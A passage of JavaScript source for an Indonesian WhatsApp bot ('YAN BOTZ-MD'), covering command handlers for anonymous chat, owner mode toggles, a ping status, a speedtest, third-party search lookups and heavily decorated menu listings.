                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await jobotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await jobotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, jobotz.user.name, m)
                }
                break
            }
 case 'public': {
 if (!isCreator) return
 jobotz.public = true
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: `Succes Change To Public\n\n©꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂` }, {quoted: fkonjo, contextInfo:{}})
 }
 break

 case 'self': {
 if (!isCreator) return
 jobotz.public = false
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: `Succes Change To Self\n\n©꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂` }, {quoted: fkonjo, contextInfo:{}})
            }
            break

case 'pong':  case 'ping': case 'botstatus': case 'statusbot': {
 if (!isCreator && !isBan) return
 let timestamp = speed()
 let latensi = speed() - timestamp
 neww = performance.now()
 oldd = performance.now()
respon = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │ ݊⃟̥⃝̇݊⃟╾•🎗𝐒𝐓𝐀𝐓𝐔𝐒_𝐁𝐎𝐓🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃    ݊⃟̥⃝̇݊⃟╾•💢𝐁𝐎𝐓_𝐀𝐊𝐓𝐈𝐅💢•╼⃟݊⃟̥⃝̇݊݊⃟ 
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾ ${runtime(process.uptime())}
┃│⃟͙⃝̇݊݊⃟ ⃟•╾ ${latensi.toFixed(4)} miliseconds
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ
`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: respon }, {quoted: fkonjo, contextInfo:{}})
   }
   break


            case 'speedtest': {
            repjo('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) repjo(stdout)
        if (stderr.trim()) repjo(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                jobotz.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `│➳ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `│➳ Name : ${i.name}\n`
            teks += `│➳ Link : ${i.link}\n`
            teks += `│➳ Developer : ${i.developer}\n`
            teks += `│➳ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            repjo(teks)
            }
            break
            case 'gsmarena': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `│➳ Title: ${judul}
│➳ Realease: ${rilis}
│➳ Size: ${ukuran}
│➳ Type: ${type}
│➳ Storage: ${storage}
│➳ Display: ${display}
│➳ Inchi: ${inchi}
│➳ Pixel: ${pixel}
│➳ Video Pixel: ${videoPixel}
│➳ Ram: ${ram}
│➳ Chipset: ${chipset}
│➳ Battery: ${batrai}
│➳ Battery Brand: ${merek_batre}
│➳ Detail: ${detail}`
            jobotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `│➳ Title: ${i.title}\n`
            capt += `│➳ Thumbnail: ${i.thumb}\n`
            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            if (!isCreator) return
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `│➳ Title: ${i.title}\n`
            capt += `│➳ Url: ${i.url}\n`
            capt += `│➳ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `│➳ Community: ${i.community}\n`
            capt += `│➳ Community Link: ${i.community_link}\n`
            capt += `│➳ Thumbnail: ${i.community_thumb}\n`
            capt += `│➳ Description: ${i.community_desc}\n`
            capt += `│➳ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `│➳ Judul: ${judul}\n`
            capt += `│➳ Dibaca: ${dibaca}\n`
            capt += `│➳ Divote: ${divote}\n`
            capt += `│➳ Bab: ${bab}\n`
            capt += `│➳ Waktu: ${waktu}\n`
            capt += `│➳ Url: ${url}\n`
            capt += `│➳ Deskripsi: ${description}`
            jobotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│➳ Judul: ${i.judul}\n`
            capt += `│➳ Like: ${i.like}\n`
            capt += `│➳ Creator: ${i.creator}\n`
            capt += `│➳ Genre: ${i.genre}\n`
            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            repjo(capt)
            }
            break
            case 'drakor': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│➳ Judul: ${i.judul}\n`
            capt += `│➳ Years: ${i.years}\n`
            capt += `│➳ Genre: ${i.genre}\n`
            capt += `│➳ Url: ${i.url}\n`
            capt += `│➳ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) return
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                repjo(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                repjo(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                repjo(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                repjo(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                jobotz.sendListMsg(m.chat, `Please select the menu you want to change!`, jobotz.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break

case 'getcase': {
if (!isCreator && !isBan) return
if (!args[0]) return reply("Mau ngambil case apa?")
const turbrek = `break`
try {
repjo(`BY YAN BOTZ-MD\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./jo.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
repjo("Case Tidak Ditemukan")
}
}
break

case 'intro': {
intronya = `${intro}`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: intronya }, {quoted: fkonjo, contextInfo:{}})
}
break

case 'entri': {
entrinya = `${entri}`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: entrinya }, {quoted: fkonjo, contextInfo:{}})
}
break

case 'menu': { 
if (!isCreator && !isBan) return
menunya = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟  
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•🌷SEMUA_MENU🌷•╼⃟݊⃟̥⃝̇݊݊⃟  
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Funmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Bugmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Mainmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Voicemenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Groupmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Ownermenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Searchmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Islamicmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Ephotomenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Tekspromenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Randommenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Primbonmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Databasemenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Photooxymenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Webzonemenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Convertermenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Downloadmenu
┃│݊⃟̥⃝̇݊݊⃟⎈➢${prefix} Anonymousmenu
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
let options2 =
{
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}}

let btn = [{
urlButton: {
displayText: 'Source Code',
url: 'https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w'
}
}, {
quickReplyButton: {
displayText: 'Script',
 id: 'sc'
}
 }]
let setbot = db.data.settings[botNumber]
if (setbot.templateImage) {
jobotz.send5ButImg(m.chat, menunya, wm, thumb, btn)
} else if (setbot.templateMsg) {
jobotz.send5ButMsg(m.chat, menunya, wm, thumb, btn)
 }
 }
            break

case 'anticall': {
                if (!isCreator && !isBan) return
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(Anticall === true) return repjo("Udah aktif")
                    Anticall = true
					repjo(`Sukses mengaktifkan Anticall`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(Anticall === false) return repjo("Sudah mati")
                    Anticall = false
					repjo(`Berhasil mematikan Anticall`)
                } else if (!q) {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Anticall`, jobotz.user.name, m)
                }
                    }
                 break

case 'listmenu':{
if (!isCreator && !isBan) return
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `SILAHKAN PILIH MENU NYA`,
description: "PILIH DI DALAM LIST",
buttonText: "CLICK DISINI",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "BUG MENU",
"rows": [
{
"title": "BUG MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}bugmenu`
}
]
},
{
"title": "OWNER MENU",
"rows": [
{
"title": "OWNER MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}ownermenu`
}
]
},
{
"title": "GRUP MENU",
"rows": [
{
"title": "GRUP MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}grupmenu`
}
]
},
{
"title": "WEBZONE MENU",
"rows": [
{
"title": "WEBZONE MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}webzonemenu`
}
]
},
{
"title": "DOWNLOAD MENU",
"rows": [
{
"title": "DOWNLOAD MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}downloadmenu`
}
]
},
{
"title": "SEARCH MENU",
"rows": [
{
"title": "SEARCH MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}searchmenu`
}
]
},
{
"title": "RANDOM MENU",
"rows": [
{
"title": "RANDOM MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}randommenu`
}
]
},
{
"title": "TEKSPRO MENU",
"rows": [
{
"title": "TEKSPRO MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}tekspromenu`
}
]
},
{
"title": "PHOTO MENU",
"rows": [
{
"title": "PHOTO MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}photomenu`
}
]
},
{
"title": "EPHOTO MENU",
"rows": [
{
"title": "EPHOTO MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}ephotomenu`
}
]
},
{
"title": "PHOTOOXY MENU",
"rows": [
{
"title": "PHOTOOXY MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}photooxymenu`
}
]
},
{
"title": "FUN MENU",
"rows": [
{
"title": "FUN MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}funmenu`
}
]
},
{
"title": "PRIMBON MENU",
"rows": [
{
"title": "PRIMBON MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}primbonmenu`
}
]
},
{
"title": "CONVERT MENU",
"rows": [
{
"title": "CONVERT MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}convertmenu`
}
]
},
{
"title": "MAIN MENU",
"rows": [
{
"title": "MAIN MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}mainmenu`
}
]
},
{
"title": "DATABASE MENU",
"rows": [
{
"title": "DATABASE MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}databasemenu`
}
]
},
{
"title": "ANONYMOUS MENU",
"rows": [
{
"title": "ANONYMOUS MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}anonymousmenu`
}
]
},
{
"title": "ISLAMIC MENU",
"rows": [
{
"title": "ISLAMIC MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}islamicmenu`
}
]
},
{
"title": "VOICE MENU",
"rows": [
{
"title": "VOICE MENU",
"description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"rowId": `${prefix}voicemenu`
}
]
},
],
listType: 1
}
}), { userJid: m.chat, quoted: m })
jobotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break

case 'allmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮
┃│  〘 GROUP MENU 〙
┃╰───────────────╯
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘WEBZONE MENU〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
